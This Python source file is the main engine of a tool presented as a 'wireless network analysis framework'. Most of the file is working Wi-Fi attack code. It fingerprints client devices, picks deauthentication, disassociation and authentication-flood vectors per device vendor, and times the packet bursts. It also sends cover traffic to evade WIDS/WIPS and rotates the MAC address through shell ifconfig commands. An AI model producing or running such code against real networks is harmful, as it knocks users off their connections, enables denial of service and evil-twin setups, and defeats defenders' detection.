"""
Advanced Wireless Network Analysis Framework - Main Engine

This module implements the core engine that orchestrates all analysis operations,
integrating packet crafting, fingerprinting, AI-driven decision making, and
data collection into a cohesive system.
"""

import os
import time
import logging
import threading
import ctypes
from collections import defaultdict, deque
from typing import Dict, List, Set, Tuple, Optional, Union, Any

# Import module components
from ..modules.packet_crafter import PacketCrafter
from ..modules.fingerprinting import DeviceFingerprinter
from ..modules.channel_hopper import ChannelHopper
from ..modules.client_tracker import ClientTracker
from ..ai.cognitive_engine import CognitiveEngine
from ..ai.pattern_miner import TemporalPatternMiner
from ..utils.logging import setup_logger
from ..utils.device_db import DeviceDatabase
from ..core.constants import (
    DEFAULT_DEAUTH_RATE, DEFAULT_PACKET_COUNT, MAX_PACKET_COUNT,
    MIN_ATTACK_INTERVAL, CLIENT_TIMEOUT, MAX_RETRIES, ATTACK_VECTORS
)

# Configure logger
logger = setup_logger(__name__)

class AnalysisEngine:
    """
    Main engine class that orchestrates all wireless network analysis operations.
    Integrates packet operations, device fingerprinting, and AI-driven decision making.
    """
    
    def __init__(self, interfaces: List[str] = None, config: Dict = None):
        """
        Initialize the analysis engine with the given configuration.
        
        Args:
            interfaces: List of wireless interfaces to use
            config: Configuration dictionary with engine parameters
        """
        self.config = config or {}
        self.interfaces = interfaces or ["wlan0mon"]
        
        # Set key parameters from config or use defaults
        self.deauth_rate = self.config.get('deauth_rate', DEFAULT_DEAUTH_RATE)
        self.packet_count = self.config.get('packet_count', DEFAULT_PACKET_COUNT)
        self.aggressive_mode = self.config.get('aggressive_mode', False)
        self.stealth_mode = self.config.get('stealth_mode', False)
        self.evasion_level = self.config.get('evasion_level', 2)
        self.enable_ai = self.config.get('enable_ai', True)
        
        # Initialize state
        self.running = False
        self.initialized = False
        
        # Client and AP tracking data structures
        self.active_clients = set()
        self.disconnected_clients = set()
        self.target_aps = {}  # BSSID -> channel mapping
        self.protected_aps = set()  # BSSIDs with PMF protection
        
        # Statistical tracking
        self.attack_stats = {
            'deauth_sent': 0,
            'disassoc_sent': 0,
            'successful_disconnects': 0,
            'failed_disconnects': 0,
            'total_clients': 0
        }
        
        # Thread management
        self.threads = []
        self.thread_stop_event = threading.Event()
        
        # Component initialization will be done in initialize()
        self.packet_crafter = None
        self.fingerprinter = None
        self.channel_hopper = None
        self.client_tracker = None
        self.cognitive_engine = None
        self.pattern_miner = None
        self.device_db = None
    
    def initialize(self) -> bool:
        """
        Initialize all engine components and resources.
        
        Returns:
            bool: True if initialization successful, False otherwise
        """
        try:
            logger.info("Initializing analysis engine components...")
            
            # Load device database
            self.device_db = DeviceDatabase()
            self.device_db.load_vendor_db()
            
            # Initialize packet crafter
            self.packet_crafter = PacketCrafter()
            
            # Initialize fingerprinter
            self.fingerprinter = DeviceFingerprinter(self.device_db)
            
            # Initialize channel hopper with configured interfaces
            self.channel_hopper = ChannelHopper(self.interfaces)
            
            # Initialize client tracker
            self.client_tracker = ClientTracker()
            
            # Initialize AI components if enabled
            if self.enable_ai:
                self.pattern_miner = TemporalPatternMiner()
                self.cognitive_engine = CognitiveEngine(pattern_miner=self.pattern_miner)
                
                # Set attack preference based on mode
                if self.stealth_mode:
                    self.cognitive_engine.set_attack_preference('stealth')
                elif self.aggressive_mode:
                    self.cognitive_engine.set_attack_preference('speed')
                else:
                    self.cognitive_engine.set_attack_preference('balanced')
            
            # Load native packet library if available
            native_lib_path = self._find_native_lib()
            if native_lib_path:
                try:
                    logger.info(f"Loading native packet library from {native_lib_path}")
                    self.native_lib = ctypes.CDLL(native_lib_path)
                    self._setup_native_lib_functions()
                except Exception as e:
                    logger.warning(f"Failed to load native packet library: {e}")
                    self.native_lib = None
            else:
                logger.info("Native packet library not found, using pure Python implementation")
                self.native_lib = None
            
            self.initialized = True
            logger.info("Analysis engine initialized successfully")
            return True
            
        except Exception as e:
            logger.error(f"Failed to initialize analysis engine: {e}")
            return False
    
    def _find_native_lib(self) -> Optional[str]:
        """
        Find the native library in common locations.
        
        Returns:
            str: Path to the native library, or None if not found
        """
        # Possible locations for the native library
        search_paths = [
            os.path.join(os.path.dirname(__file__), '..', '..', 'native', 'libpacket.so'),
            os.path.join(os.path.dirname(__file__), '..', 'native', 'libpacket.so'),
            '/usr/local/lib/libpacket.so',
            '/usr/lib/libpacket.so',
            'libpacket.so'
        ]
        
        for path in search_paths:
            if os.path.exists(path):
                return path
        
        return None
    
    def _setup_native_lib_functions(self):
        """Setup the function signatures for the native library"""
        if not self.native_lib:
            return
            
        try:
            # Initialize the library
            self.native_lib.initialize()
            
            # Set up function signatures
            self.native_lib.send_deauth.argtypes = [
                ctypes.c_char_p,  # interface
                ctypes.c_char_p,  # bssid
                ctypes.c_char_p,  # client
                ctypes.c_int,     # count
                ctypes.c_int      # reason
            ]
            self.native_lib.send_deauth.restype = ctypes.c_int
            
            self.native_lib.send_disassoc.argtypes = [
                ctypes.c_char_p,  # interface
                ctypes.c_char_p,  # bssid
                ctypes.c_char_p,  # client
                ctypes.c_int,     # count
                ctypes.c_int      # reason
            ]
            self.native_lib.send_disassoc.restype = ctypes.c_int
            
            self.native_lib.send_null_func.argtypes = [
                ctypes.c_char_p,  # interface
                ctypes.c_char_p,  # bssid
                ctypes.c_char_p,  # client
                ctypes.c_int      # count
            ]
            self.native_lib.send_null_func.restype = ctypes.c_int
            
            self.native_lib.send_auth_flood.argtypes = [
                ctypes.c_char_p,  # interface
                ctypes.c_char_p,  # bssid
                ctypes.c_char_p,  # client
                ctypes.c_int      # count
            ]
            self.native_lib.send_auth_flood.restype = ctypes.c_int
            
            self.native_lib.set_channel.argtypes = [
                ctypes.c_char_p,  # interface
                ctypes.c_int      # channel
            ]
            self.native_lib.set_channel.restype = ctypes.c_int
            
            logger.info("Native library functions initialized")
        except Exception as e:
            logger.error(f"Error setting up native library functions: {e}")
            self.native_lib = None
    
    def start(self) -> bool:
        """
        Start the analysis engine and all its components.
        
        Returns:
            bool: True if started successfully, False otherwise
        """
        if self.running:
            logger.warning("Engine is already running")
            return True
            
        if not self.initialized and not self.initialize():
            logger.error("Failed to initialize engine")
            return False
        
        try:
            logger.info("Starting analysis engine...")
            
            # Reset stop event
            self.thread_stop_event.clear()
            
            # Start channel hopper
            self._start_channel_hopper()
            
            # Start client monitor
            self._start_client_monitor()
            
            # Start packet processor if needed
            self._start_packet_processor()
            
            # Start AI components if enabled
            if self.enable_ai:
                self._start_ai_components()
            
            # Start additional threads based on mode
            if not self.stealth_mode:
                self._start_noise_generator()
            
            if self.evasion_level >= 2:
                self._start_mac_rotator()
            
            self.running = True
            logger.info("Analysis engine started successfully")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start analysis engine: {e}")
            self.stop()  # Clean up any started components
            return False
    
    def stop(self):
        """Stop the analysis engine and all its components"""
        if not self.running:
            return
            
        logger.info("Stopping analysis engine...")
        
        # Signal all threads to stop
        self.thread_stop_event.set()
        
        # Wait for all threads to finish
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2.0)
        
        # Clean up native library if loaded
        if self.native_lib:
            try:
                self.native_lib.cleanup()
            except Exception as e:
                logger.warning(f"Error cleaning up native library: {e}")
        
        self.running = False
        self.threads = []
        logger.info("Analysis engine stopped")
    
    def _start_channel_hopper(self):
        """Start the channel hopping thread"""
        if len(self.interfaces) > 1:
            def channel_hopper_thread():
                logger.info("Channel hopper thread started")
                
                while not self.thread_stop_event.is_set():
                    try:
                        channels = self.get_target_channels()
                        self.channel_hopper.hop_between_channels(channels)
                    except Exception as e:
                        logger.error(f"Error in channel hopper: {e}")
                    
                    # Sleep before next hop
                    time.sleep(5)
                
                logger.info("Channel hopper thread stopped")
            
            thread = threading.Thread(target=channel_hopper_thread, daemon=True)
            thread.start()
            self.threads.append(thread)
    
    def _start_client_monitor(self):
        """Start the client monitoring thread"""
        def client_monitor_thread():
            logger.info("Client monitor thread started")
            
            while not self.thread_stop_event.is_set():
                try:
                    current_time = time.time()
                    
                    # Check for client timeouts
                    for client in list(self.active_clients):
                        last_seen = self.client_tracker.get_last_seen(client)
                        
                        if current_time - last_seen > CLIENT_TIMEOUT:
                            self._mark_client_disconnected(client, current_time)
                    
                    # Check for client reconnects
                    for client in list(self.disconnected_clients):
                        disconnect_time = self.client_tracker.get_disconnect_time(client)
                        last_seen = self.client_tracker.get_last_seen(client)
                        
                        if last_seen > disconnect_time:
                            self._handle_client_reconnect(client, disconnect_time, last_seen)
                        
                        # Clean up old clients
                        elif current_time - disconnect_time > 300:  # 5 minutes
                            self.disconnected_clients.discard(client)
                    
                except Exception as e:
                    logger.error(f"Error in client monitor: {e}")
                
                # Wait before next check
                time.sleep(2)
            
            logger.info("Client monitor thread stopped")
        
        thread = threading.Thread(target=client_monitor_thread, daemon=True)
        thread.start()
        self.threads.append(thread)
    
    def _start_packet_processor(self):
        """Start the packet processing thread if needed"""
        # This would process packets from a queue if we're using a separate capture thread
        pass
    
    def _start_ai_components(self):
        """Start the AI component threads"""
        if not self.enable_ai:
            return
            
        # Start strategy adaptation thread
        def strategy_adaptation_thread():
            logger.info("Strategy adaptation thread started")
            
            while not self.thread_stop_event.is_set():
                try:
                    # Analyze client patterns and adapt strategies
                    for client in self.active_clients:
                        if self.client_tracker.get_attempt_count(client) >= 3:
                            # Use cognitive engine to optimize strategy
                            strategy = self.cognitive_engine.get_optimized_strategy(client)
                            self.client_tracker.update_client_strategy(client, strategy)
                except Exception as e:
                    logger.error(f"Error in strategy adaptation: {e}")
                
                # Wait before next adaptation
                time.sleep(10)
            
            logger.info("Strategy adaptation thread stopped")
        
        thread = threading.Thread(target=strategy_adaptation_thread, daemon=True)
        thread.start()
        self.threads.append(thread)
        
        # Start reinforcement learning thread
        def reinforcement_learning_thread():
            logger.info("Reinforcement learning thread started")
            
            while not self.thread_stop_event.is_set():
                try:
                    if self.cognitive_engine:
                        self.cognitive_engine.train_models()
                except Exception as e:
                    logger.error(f"Error in reinforcement learning: {e}")
                
                # Wait before next training cycle
                time.sleep(30)
            
            logger.info("Reinforcement learning thread stopped")
        
        thread = threading.Thread(target=reinforcement_learning_thread, daemon=True)
        thread.start()
        self.threads.append(thread)
    
    def _start_noise_generator(self):
        """Start the noise generation thread for WIDS/WIPS evasion"""
        def noise_generator_thread():
            logger.info("Noise generator thread started")
            
            while not self.thread_stop_event.is_set():
                try:
                    # Only generate noise if we're actively analyzing
                    if self.active_clients and self.target_aps:
                        self._generate_cover_traffic()
                except Exception as e:
                    logger.error(f"Error in noise generator: {e}")
                
                # Random sleep between noise bursts
                sleep_time = 5 if self.stealth_mode else 2
                time.sleep(sleep_time)
            
            logger.info("Noise generator thread stopped")
        
        thread = threading.Thread(target=noise_generator_thread, daemon=True)
        thread.start()
        self.threads.append(thread)
    
    def _start_mac_rotator(self):
        """Start the MAC address rotation thread for advanced evasion"""
        def mac_rotator_thread():
            logger.info("MAC rotator thread started")
            
            while not self.thread_stop_event.is_set():
                try:
                    # Only rotate MACs if not actively attacking many clients
                    if len(self.active_clients) < 3:
                        self._rotate_mac_address()
                except Exception as e:
                    logger.error(f"Error in MAC rotator: {e}")
                
                # Wait longer in stealth mode
                sleep_time = 120 if self.stealth_mode else 60
                time.sleep(sleep_time)
            
            logger.info("MAC rotator thread stopped")
        
        thread = threading.Thread(target=mac_rotator_thread, daemon=True)
        thread.start()
        self.threads.append(thread)
    
    def process_packet(self, packet: Any) -> None:
        """
        Process a captured packet and perform the appropriate actions
        
        Args:
            packet: The captured packet
        """
        try:
            # Extract basic information
            client_mac, ap_mac, channel = self.packet_crafter.extract_packet_info(packet)
            if not client_mac or not ap_mac:
                return
            
            # Update client activity
            if client_mac not in self.disconnected_clients:
                self.active_clients.add(client_mac)
                self.client_tracker.update_client_seen(client_mac)
            
            # Update known APs
            if ap_mac in self.target_aps and self.target_aps[ap_mac] != channel:
                logger.info(f"AP {ap_mac} changed channel from {self.target_aps[ap_mac]} to {channel}")
                self.target_aps[ap_mac] = channel
            
            # Fingerprint client if not already done
            if not self.fingerprinter.is_fingerprinted(client_mac):
                fingerprint = self.fingerprinter.fingerprint_device(packet, client_mac)
                if fingerprint:
                    # Update client attributes based on fingerprint
                    if fingerprint.get('pmf_detected'):
                        self.protected_aps.add(ap_mac)
                    
                    # Update cognitive engine with fingerprint data
                    if self.cognitive_engine:
                        self.cognitive_engine.update_client_profile(client_mac, fingerprint)
            
            # Record activity for temporal pattern mining
            if self.pattern_miner:
                metadata = self.packet_crafter.get_packet_metadata(packet)
                self.pattern_miner.record_activity(client_mac, time.time(), 
                                                 metadata.get('packet_type', 'unknown'), metadata)
            
            # For target APs, check if we should launch attack
            if ap_mac in self.target_aps and client_mac in self.active_clients:
                self._consider_client_attack(client_mac, ap_mac, channel)
                
        except Exception as e:
            logger.error(f"Error processing packet: {e}")
    
    def _consider_client_attack(self, client_mac: str, ap_mac: str, channel: int):
        """
        Determine if we should attack a specific client
        
        Args:
            client_mac: Client MAC address
            ap_mac: AP MAC address
            channel: Current channel
        """
        # Skip if client is already known to be disconnected
        if client_mac in self.disconnected_clients:
            return
        
        # Check rate limiting
        current_time = time.time()
        last_attack = self.client_tracker.get_last_attack_time(client_mac)
        
        if current_time - last_attack < MIN_ATTACK_INTERVAL:
            return
        
        # Check max retry limit
        if self.client_tracker.get_attempt_count(client_mac) > MAX_RETRIES:
            logger.debug(f"Max retries reached for {client_mac}")
            return
        
        # Get attack strategy
        if self.cognitive_engine:
            strategy = self.cognitive_engine.select_action(client_mac)
        else:
            # Default strategy if no cognitive engine
            strategy = self._get_default_strategy(client_mac)
        
        # Schedule attack with appropriate timing
        delay = strategy.get('delay', 0)
        
        if delay > 0:
            # Delayed attack
            threading.Timer(delay, 
                          lambda: self._execute_attack(client_mac, ap_mac, channel, strategy)
                         ).start()
        else:
            # Immediate attack
            self._execute_attack(client_mac, ap_mac, channel, strategy)
    
    def _execute_attack(self, client_mac: str, ap_mac: str, channel: int, strategy: Dict):
        """
        Execute an attack against a client using the specified strategy
        
        Args:
            client_mac: Client MAC address
            ap_mac: AP MAC address
            channel: Current channel
            strategy: Attack strategy to use
        """
        # Update attack stats
        self.client_tracker.increment_attack_attempt(client_mac)
        
        # Get attack parameters
        vector = strategy.get('vector', 'deauth')
        count = strategy.get('count', self.packet_count)
        reason = strategy.get('reason', 7)
        
        # Adjust count based on mode
        if self.aggressive_mode:
            count = MAX_PACKET_COUNT
        elif self.stealth_mode:
            count = min(3, count)
        
        # Select interface
        interface = self.interfaces[0]
        if len(self.interfaces) > 1:
            # Use interface based on channel hash
            interface = self.interfaces[hash(channel) % len(self.interfaces)]
        
        # Execute attack using native library if available
        if self.native_lib:
            self._execute_native_attack(interface, ap_mac, client_mac, vector, count, reason)
        else:
            self._execute_python_attack(interface, ap_mac, client_mac, vector, count, reason)
        
        # Record attack time
        self.client_tracker.update_attack_time(client_mac)
        
        # Update cognitive engine
        if self.cognitive_engine:
            self.cognitive_engine.update_with_action(client_mac, strategy)
        
        logger.info(f"Attacked client {client_mac} using vector {vector} (attempt {self.client_tracker.get_attempt_count(client_mac)})")
    
    def _execute_native_attack(self, interface: str, ap_mac: str, client_mac: str, 
                              vector: str, count: int, reason: int):
        """
        Execute attack using native C library
        
        Args:
            interface: Interface to use
            ap_mac: AP MAC address
            client_mac: Client MAC address
            vector: Attack vector to use
            count: Number of packets to send
            reason: Reason code
        """
        if not self.native_lib:
            return
        
        try:
            # Convert parameters to bytes for ctypes
            interface_b = interface.encode('utf-8')
            ap_mac_b = ap_mac.encode('utf-8')
            client_mac_b = client_mac.encode('utf-8')
            
            # Select appropriate function based on vector
            if vector == 'deauth':
                result = self.native_lib.send_deauth(interface_b, ap_mac_b, client_mac_b, count, reason)
                self.attack_stats['deauth_sent'] += count
            elif vector == 'disassoc':
                result = self.native_lib.send_disassoc(interface_b, ap_mac_b, client_mac_b, count, reason)
                self.attack_stats['disassoc_sent'] += count
            elif vector == 'null_func':
                result = self.native_lib.send_null_func(interface_b, ap_mac_b, client_mac_b, count)
            elif vector == 'auth_flood':
                result = self.native_lib.send_auth_flood(interface_b, ap_mac_b, client_mac_b, count)
            else:
                logger.warning(f"Unsupported attack vector for native library: {vector}")
                result = -1
            
            if result != 0:
                logger.warning(f"Native attack returned error code: {result}")
                
        except Exception as e:
            logger.error(f"Error executing native attack: {e}")
    
    def _execute_python_attack(self, interface: str, ap_mac: str, client_mac: str, 
                              vector: str, count: int, reason: int):
        """
        Execute attack using Python implementation
        
        Args:
            interface: Interface to use
            ap_mac: AP MAC address
            client_mac: Client MAC address
            vector: Attack vector to use
            count: Number of packets to send
            reason: Reason code
        """
        try:
            packets = self.packet_crafter.craft_attack_packets(
                ap_mac, client_mac, vector, count, reason
            )
            
            # Send packets
            for packet in packets:
                self.packet_crafter.send_packet(packet, interface)
                time.sleep(0.002)  # Small delay between packets
            
            # Update stats
            if vector == 'deauth':
                self.attack_stats['deauth_sent'] += count
            elif vector == 'disassoc':
                self.attack_stats['disassoc_sent'] += count
                
        except Exception as e:
            logger.error(f"Error executing Python attack: {e}")
    
    def _get_default_strategy(self, client_mac: str) -> Dict:
        """
        Get default attack strategy for a client
        
        Args:
            client_mac: Client MAC address
            
        Returns:
            dict: Default strategy
        """
        # Get device category
        category = self.fingerprinter.get_device_category(client_mac)
        
        # Define strategies by category
        strategies = {
            'APPLE': {
                'vector': 'deauth',
                'count': 8,
                'reason': 7,
                'burst': 2
            },
            'SAMSUNG': {
                'vector': 'disassoc',
                'count': 6,
                'reason': 3,
                'burst': 1
            },
            'DEFAULT': {
                'vector': 'deauth',
                'count': self.packet_count,
                'reason': 7,
                'burst': 1
            }
        }
        
        # Return strategy for category or default
        return strategies.get(category, strategies['DEFAULT'])
    
    def _mark_client_disconnected(self, client: str, current_time: float):
        """
        Mark a client as disconnected
        
        Args:
            client: Client MAC address
            current_time: Current timestamp
        """
        self.disconnected_clients.add(client)
        self.active_clients.discard(client)
        self.client_tracker.set_disconnect_time(client, current_time)
        
        logger.info(f"Client {client} marked as disconnected (timeout)")
        self.attack_stats['successful_disconnects'] += 1
        
        # Notify pattern miner
        if self.pattern_miner:
            self.pattern_miner.record_activity(
                client, current_time, 'disconnected', {'by': 'timeout'}
            )
        
        # Notify cognitive engine
        if self.cognitive_engine:
            self.cognitive_engine.update_with_result(client, True)
    
    def _handle_client_reconnect(self, client: str, disconnect_time: float, last_seen: float):
        """
        Handle client reconnection
        
        Args:
            client: Client MAC address
            disconnect_time: Time when client was disconnected
            last_seen: Time when client was last seen
        """
        self.disconnected_clients.discard(client)
        self.active_clients.add(client)
        
        # Calculate reconnect time
        reconnect_time = last_seen - disconnect_time
        self.client_tracker.add_reconnect_time(client, reconnect_time)
        
        logger.info(f"Client {client} reconnected after {reconnect_time:.2f}s")
        self.attack_stats['failed_disconnects'] += 1
        
        # Notify pattern miner
        if self.pattern_miner:
            self.pattern_miner.record_activity(
                client, time.time(), 'reconnected', {'time': reconnect_time}
            )
        
        # Notify cognitive engine
        if self.cognitive_engine:
            self.cognitive_engine.update_with_result(client, False)
    
    def _generate_cover_traffic(self):
        """Generate cover traffic to evade detection"""
        if self.stealth_mode:
            return
            
        try:
            # Select a random AP and channel
            if not self.target_aps:
                return
                
            ap_mac = random.choice(list(self.target_aps.keys()))
            channel = self.target_aps[ap_mac]
            
            # Create different types of benign-looking traffic
            noise_type = random.choice(['probe_request', 'null_data', 'data'])
            packets = self.packet_crafter.generate_noise_packets(ap_mac, noise_type)
            
            # Send the packets
            if packets:
                for packet in packets:
                    # Use appropriate interface
                    interface = self.interfaces[0]
                    if len(self.interfaces) > 1:
                        interface = self.interfaces[hash(channel) % len(self.interfaces)]
                        
                    self.packet_crafter.send_packet(packet, interface)
                    time.sleep(random.uniform(0.1, 0.3))
                    
                logger.debug(f"Sent {len(packets)} noise packets of type {noise_type}")
                
        except Exception as e:
            logger.error(f"Error generating cover traffic: {e}")
    
    def _rotate_mac_address(self):
        """Rotate MAC address for evasion"""
        if len(self.interfaces) <= 0:
            return
            
        try:
            # Select interface to change
            interface = random.choice(self.interfaces)
            
            # Generate random MAC
            new_mac = self.packet_crafter.generate_random_mac()
            
            # Change MAC using OS commands
            os.system(f"ifconfig {interface} down")
            os.system(f"ifconfig {interface} hw ether {new_mac}")
            os.system(f"ifconfig {interface} up")
            
            logger.info(f"Rotated MAC address of {interface} to {new_mac}")
            
        except Exception as e:
            logger.error(f"Error rotating MAC address: {e}")
    
    def get_target_channels(self) -> List[int]:
        """
        Get the list of channels to target
        
        Returns:
            list: List of channel numbers
        """
        # If we have known target APs, use their channels
        if self.target_aps:
            channels = list(set(self.target_aps.values()))
            if channels:
                return [int(ch) for ch in channels]
        
        # Default to common 2.4GHz channels
        return [1, 6, 11]
    
    def add_target_ap(self, bssid: str, essid: str, channel: int) -> None:
        """
        Add an access point to the target list
        
        Args:
            bssid: BSSID of the AP
            essid: ESSID of the AP
            channel: Channel the AP is on
        """
        if bssid not in self.target_aps:
            logger.info(f"Adding target AP: {bssid} ({essid}) on channel {channel}")
            self.target_aps[bssid] = channel
    
    def get_status(self) -> Dict:
        """
        Get the current status of the engine
        
        Returns:
            dict: Status information
        """
        return {
            'running': self.running,
            'active_clients': len(self.active_clients),
            'disconnected_clients': len(self.disconnected_clients),
            'target_aps': len(self.target_aps),
            'attack_stats': self.attack_stats,
            'interfaces': self.interfaces,
            'mode': 'aggressive' if self.aggressive_mode else 'stealth' if self.stealth_mode else 'normal',
            'ai_enabled': self.enable_ai
        }